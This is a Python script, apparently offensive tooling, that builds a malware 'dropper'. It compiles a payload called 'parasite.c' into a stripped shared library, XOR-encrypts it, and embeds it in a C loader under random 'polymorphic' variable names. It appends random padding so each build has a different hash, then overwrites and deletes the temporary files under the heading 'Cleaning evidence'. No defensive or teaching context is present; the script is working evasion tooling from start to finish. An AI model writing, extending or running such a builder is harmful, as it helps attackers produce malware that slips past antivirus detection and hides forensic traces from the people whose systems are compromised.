#!/usr/bin/env python3
import os
import secrets
import subprocess
import hashlib
import sys

# Configurations
PAYLOAD_SRC = "payload_src/parasite.c"
LOADER_TEMPLATE = "loader_forge.c"
TEMP_PAYLOAD_SO = "temp_ghost.so"
TEMP_LOADER_SRC = "temp_loader.c"
OUTPUT_BINARY = "dropper"

def compile_payload():
    print("[*] Compiling payload...")
    # Flags de Sigilo (Hardening):
    # -shared -fPIC: Shared Object
    # -s: Strip all
    # -Os: Optimize for size
    # -fvisibility=hidden: Hide symbols
    cmd = [
        "gcc", "-shared", "-fPIC", "-s", "-Os", "-fvisibility=hidden",
        PAYLOAD_SRC, "-o", TEMP_PAYLOAD_SO, "-lpthread"
    ]
    try:
        subprocess.check_call(cmd)
    except subprocess.CalledProcessError as e:
        print(f"[!] Compilation failed: {e}")
        sys.exit(1)

def generate_key():
    return secrets.token_bytes(16)

def xor_data(data, key):
    key_len = len(key)
    return bytes([b ^ key[i % key_len] for i, b in enumerate(data)])

def random_name(length=8):
    # Generar nombre de variable C válido (letras y números, empieza con letra)
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return secrets.choice(alphabet) + ''.join(secrets.choice(chars) for _ in range(length-1))

def format_c_array(data):
    # Formato { 0x01, 0x02, ... }
    hex_str = ", ".join([f"0x{b:02x}" for b in data])
    return f"{{ {hex_str} }}"

def secure_delete(path):
    if os.path.exists(path):
        size = os.path.getsize(path)
        # Sobrescribir con datos aleatorios
        with open(path, "wb") as f:
            f.write(secrets.token_bytes(size))
        os.remove(path)

def forge():
    print("[Terminal: Root, Fecha: Null, Estado: Forging]")

    # 1. Compile Payload
    compile_payload()

    # 2. Entropy Injection
    print("[*] Injecting entropy...")
    try:
        with open(TEMP_PAYLOAD_SO, "rb") as f:
            payload_data = f.read()
    except FileNotFoundError:
        print(f"[!] Error: {TEMP_PAYLOAD_SO} not found.")
        sys.exit(1)

    key = generate_key()
    encrypted_payload = xor_data(payload_data, key)

    # Generate Names
    key_var_name = random_name()
    payload_var_name = random_name()
    len_var_name = random_name()

    print(f"[*] Generated polymorphic variables: {key_var_name}, {payload_var_name}")

    # 3. The Blood Contract (Generate Header/Source Content)
    print("[*] Forging C source...")

    c_block = f"""
#define KEY_SIZE 16
unsigned char {key_var_name}[] = {format_c_array(key)};
unsigned char {payload_var_name}[] = {format_c_array(encrypted_payload)};
unsigned int {len_var_name} = {len(encrypted_payload)};

#define GET_KEY() {key_var_name}
#define GET_PAYLOAD() {payload_var_name}
#define GET_PAYLOAD_SIZE() {len_var_name}
"""

    try:
        with open(LOADER_TEMPLATE, "r") as f:
            template = f.read()
    except FileNotFoundError:
        print(f"[!] Error: {LOADER_TEMPLATE} not found.")
        sys.exit(1)

    # Replace placeholder
    final_src = template.replace("//__POLYMORPHIC_BLOCK__", c_block)

    with open(TEMP_LOADER_SRC, "w") as f:
        f.write(final_src)

    # 4. Final Fusion
    print("[*] Compiling dropper...")
    # flags: -no-pie -fvisibility=hidden -s
    cmd = [
        "gcc", "-no-pie", "-fvisibility=hidden", "-s",
        TEMP_LOADER_SRC, "-o", OUTPUT_BINARY, "-ldl"
    ]
    try:
        subprocess.check_call(cmd)
    except subprocess.CalledProcessError as e:
        print(f"[!] Dropper compilation failed: {e}")
        sys.exit(1)

    # Padding (Optional)
    pad_len = secrets.randbelow(1024) + 128
    with open(OUTPUT_BINARY, "ab") as f:
        f.write(secrets.token_bytes(pad_len))

    # 5. Hygiene
    print("[*] Cleaning evidence...")
    secure_delete(TEMP_PAYLOAD_SO)
    secure_delete(TEMP_LOADER_SRC)

    # 6. Validation
    with open(OUTPUT_BINARY, "rb") as f:
        digest = hashlib.sha256(f.read()).hexdigest()

    print(f"[*] Artifact forged successfully.")
    print(f"[*] Target: {OUTPUT_BINARY}")
    print(f"[*] SHA-256: {digest}")

if __name__ == "__main__":
    forge()
